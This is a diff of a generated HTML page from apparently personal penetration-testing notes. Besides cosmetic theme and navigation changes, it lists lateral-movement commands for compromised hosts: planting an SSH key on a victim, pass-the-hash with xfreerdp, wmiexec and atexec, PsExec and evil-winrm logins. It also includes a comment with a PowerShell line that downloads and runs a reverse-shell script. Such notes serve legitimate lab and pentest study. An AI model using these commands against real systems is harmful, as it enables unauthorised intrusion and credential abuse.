@@ -25,7 +25,7 @@
         
           
           
-          <meta name="theme-color" content="#ff6e42">
+          <meta name="theme-color" content="#000000">
         
       
     
@@ -52,7 +52,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="green">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
       
   
     
@@ -153,9 +153,7 @@
 
 
 
-  
-
-<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
       
@@ -193,7 +191,9 @@
   
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
@@ -373,17 +373,76 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
       
       <label class="md-nav__link" for="nav-3">
+        File Transfer
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="File Transfer" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          File Transfer
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/filetransfer_setup/" class="md-nav__link">
+        Environment Setup
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/ft_windows/" class="md-nav__link">
+        Windows File Transfers
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+      
+      <label class="md-nav__link" for="nav-4">
         WebApps
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="WebApps" data-md-level="1">
-        <label class="md-nav__title" for="nav-3">
+        <label class="md-nav__title" for="nav-4">
           <span class="md-nav__icon md-icon"></span>
           WebApps
         </label>
@@ -416,17 +475,19 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" data-md-state="indeterminate" type="checkbox" id="nav-5" checked>
       
-      <label class="md-nav__link" for="nav-4">
+      <label class="md-nav__link" for="nav-5">
         HTB
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="HTB" data-md-level="1">
-        <label class="md-nav__title" for="nav-4">
+        <label class="md-nav__title" for="nav-5">
           <span class="md-nav__icon md-icon"></span>
           HTB
         </label>
@@ -482,6 +543,112 @@
               </div>
             
             
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    Linux
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssh-dropping-a-key" class="md-nav__link">
+    SSH + Dropping a key
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    Windows
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    RDP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    SMB
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#winrm" class="md-nav__link">
+    WinRM
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wmi" class="md-nav__link">
+    WMI
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    Scheduled Tasks
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#changing-user-context-for-cmd" class="md-nav__link">
+    Changing user context for cmd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-kerberos-config-in-linux" class="md-nav__link">
+    Adding kerberos config in linux
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -493,7 +660,14 @@
 <h2 id="linux">Linux</h2>
 <h3 id="ssh-dropping-a-key">SSH + Dropping a key</h3>
 <p>If you compromise a user and is a ssh capable user (check for a login shell in /etc/passwd), it is possible to get his ssh key in <code>~/.ssh/id_rsa</code> if its located in the typical location. If there is no key, it is always possible to drop one with two simple commands:
-<div class="highlight"><pre><span></span><code><span class="c1">#Create the key</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="c1">#Create the key</span>
 ssh-keygen -f ./key <span class="c1">#Accept all prompts</span>
 cat ./key.pub <span class="c1">#Copy the public key</span>
 <span class="c1"># In the victim machine</span>
@@ -501,7 +675,8 @@ cat ./key.pub <span class="c1">#Copy the public key</span>
 <span class="c1"># In your machine again</span>
 chmod <span class="m">600</span> key
 ssh -i key user@machine
-</code></pre></div></p>
+</code></pre></div>
+</td></tr></table></p>
 <h2 id="windows">Windows</h2>
 <p>Below is a table used as a cheatsheet for different ways to connect remotely depending on open ports:</p>
 <p><img alt="RemoteAccess" src="../images/remote_access.png" /></p>
@@ -510,14 +685,17 @@ ssh -i key user@machine
 <li>Port: 3389</li>
 <li>Tools<ul>
 <li>Microsoft RDP Client (<code>mstsc.exe</code>)
-<div class="highlight"><pre><span></span><code>mstsc.exe /v:hostname:port /admin
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>mstsc.exe /v:hostname:port /admin
+</code></pre></div>
+</td></tr></table></li>
 <li>XFreeRDP: 
-<div class="highlight"><pre><span></span><code>xfreerdp /u:user /d:domain /pth:&lt;NTLM&gt; /v:10.0.0.2
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>xfreerdp /u:user /d:domain /pth:&lt;NTLM&gt; /v:10.0.0.2
+</code></pre></div>
+</td></tr></table></li>
 <li>RDesktop: 
-<div class="highlight"><pre><span></span><code>rdesktop -g 90% 10.0.0.1
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>rdesktop -g 90% 10.0.0.1
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 </ul>
@@ -531,14 +709,18 @@ Credit: https://dolosgroup.io/blog/remote-access-cheat-sheet</p>
 <li>Port: 445</li>
 <li>
 <p>Tools
-    <div class="highlight"><pre><span></span><code>PsExec.exe \\10.0.0.1 -u user -p pass cmd.exe
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>PsExec.exe \\10.0.0.1 -u user -p pass cmd.exe
 </code></pre></div>
-    <div class="highlight"><pre><span></span><code>psexec.py &#39;user&#39;:&#39;pass&#39;@10.0.0.1 cmd.exe
+</td></tr></table>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>psexec.py &#39;user&#39;:&#39;pass&#39;@10.0.0.1 cmd.exe
 </code></pre></div>
-    <div class="highlight"><pre><span></span><code>smbexec.py &#39;user&#39;:&#39;pass&#39;@10.0.0.1 cmd.exe
+</td></tr></table>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>smbexec.py &#39;user&#39;:&#39;pass&#39;@10.0.0.1 cmd.exe
 </code></pre></div>
-    <div class="highlight"><pre><span></span><code>winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe
-</code></pre></div></p>
+</td></tr></table>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe
+</code></pre></div>
+</td></tr></table></p>
 <div class="admonition info">
 <p class="admonition-title">Info</p>
 <p>If Credentials with administrative privileges are provided, it is possible to spawn a shell with NT Authority\System user passing the <code>-s</code> flag to PsExec.exe<br>
@@ -556,11 +738,13 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <p><a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a></p>
 <ul>
 <li>Normal login 
-<div class="highlight"><pre><span></span><code>evil-winrm -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39;
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>evil-winrm -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39;
+</code></pre></div>
+</td></tr></table></li>
 <li>Cert Login 
-<div class="highlight"><pre><span></span><code>evil-winrm -i 10.0.0.1 -c user.crt -k user.key
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>evil-winrm -i 10.0.0.1 -c user.crt -k user.key
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 <div class="admonition info">
 <p class="admonition-title">Info</p>
@@ -569,8 +753,9 @@ Also if you are doing this in an interactive command prompt, you could also pass
 </li>
 <li>
 <p>From Windows Machine
-    <div class="highlight"><pre><span></span><code>New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession
-</code></pre></div></p>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession
+</code></pre></div>
+</td></tr></table></p>
 <ul>
 <li>In the section <a href="#changing-user-context-for-cmd">changing user context</a> a method to create a Credential object is explained.</li>
 </ul>
@@ -584,16 +769,19 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <li>Tools<ul>
 <li>Impacket-wmiexec<ul>
 <li>Normal
-<div class="highlight"><pre><span></span><code>wmiexec.py domain/user:pass@target_ip
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>wmiexec.py domain/user:pass@target_ip
+</code></pre></div>
+</td></tr></table></li>
 <li>Pass the hash
-<div class="highlight"><pre><span></span><code>wmiexec.py user@target_ip -hashes LM:NT
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>wmiexec.py user@target_ip -hashes LM:NT
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 <li>wmic.exe
-    <div class="highlight"><pre><span></span><code>wmic.exe /USER:&quot;domain\user&quot; /PASSWORD:&quot;Password&quot; /NODE:10.0.0.1 service get &quot;startname,pathname&quot;
-</code></pre></div></li>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>wmic.exe /USER:&quot;domain\user&quot; /PASSWORD:&quot;Password&quot; /NODE:10.0.0.1 service get &quot;startname,pathname&quot;
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 </ul>
@@ -602,8 +790,9 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <li>Port: 135/TCP (RPC), High TCP (DCOM)</li>
 <li>Tools:<ul>
 <li>atexec (Impacket)
-    <div class="highlight"><pre><span></span><code>atexec.py user@target_ip -hashes LM:NT
-</code></pre></div></li>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>atexec.py user@target_ip -hashes LM:NT
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 </ul>
@@ -611,11 +800,13 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <ul>
 <li>In a cmd interactive session<ul>
 <li>runas
-<div class="highlight"><pre><span></span><code>runas /netonly /user:domain\user &quot;powershell.exe&quot;
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>runas /netonly /user:domain\user &quot;powershell.exe&quot;
+</code></pre></div>
+</td></tr></table></li>
 <li>psexec
-<div class="highlight"><pre><span></span><code>PsExec.exe -u user -p pass -i cmd.exe
-</code></pre></div></li>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>PsExec.exe -u user -p pass -i cmd.exe
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 <li>
@@ -623,10 +814,13 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <ul>
 <li>
 <p>Invoke-Command</p>
-<div class="highlight"><pre><span></span><code><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
 <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span>
 <span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">COMPUTER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">command</span> <span class="p">}</span> <span class="c">#Example command: iex (New-Object Net.WebClient).DownloadString(&#39;bla/rev.ps1&#39;)</span>
 </code></pre></div>
+</td></tr></table>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
 <p>If you are having problems with <a href="https://docs.microsoft.com/es-es/powershell/scripting/learn/remoting/ps-remoting-second-hop?view=powershell-7.1">"powershell double jump"</a> you can pass the <code>-Authentication CredSSP</code> to fix it. </p>
@@ -638,15 +832,21 @@ Also if you are doing this in an interactive command prompt, you could also pass
 <h3 id="adding-kerberos-config-in-linux">Adding kerberos config in linux</h3>
 <ol>
 <li>Edit the /etc/krb5.conf adding the following (adapt):
-    <div class="highlight"><pre><span></span><code>[realms]
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>[realms]
 DOMAIN.LOCAL = {
 kdc = 10.0.0.1
 }
-</code></pre></div></li>
+</code></pre></div>
+</td></tr></table></li>
 <li>Get a ticket
-<div class="highlight"><pre><span></span><code>kinit user
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>kinit user
 klist
-</code></pre></div></li>
+</code></pre></div>
+</td></tr></table></li>
 </ol>
                 
               
@@ -720,7 +920,7 @@ klist
       <script>
         app = initialize({
           base: "../..",
-          features: ['navigation.expand', 'toc.integrate'],
+          features: ['navigation.sections', 'navigation.expand'],
           search: Object.assign({
             worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
           }, typeof search !== "undefined" && search)
